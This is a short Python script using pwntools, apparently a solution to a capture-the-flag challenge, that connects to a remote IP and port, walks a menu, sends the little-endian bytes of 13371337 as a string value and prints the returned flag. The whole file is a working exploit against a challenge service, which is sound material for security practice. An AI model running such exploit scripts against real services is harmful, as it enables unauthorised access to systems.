from pwn import *

def main():
    # Connect to the remote service
    p = remote('94.237.59.63', 59279)

    # Set up the interaction to input the bytes for 13371337 in little-endian format
    p.sendlineafter(b'>> ', b'T')         # Choose to set a field
    p.sendlineafter(b'>> ', b'S')         # Choose STRING type
    p.sendlineafter(b'>> ', p64(13371337))  # Send the little-endian representation of 13371337
    p.sendlineafter(b'>> ', b'C')         # Choose to get the flag 

    # Print the response, which should be the flag 94.237.59.63:59279
    print(p.recvline().decode())

    # Close the connection
    p.close()

if __name__ == "__main__":
    main()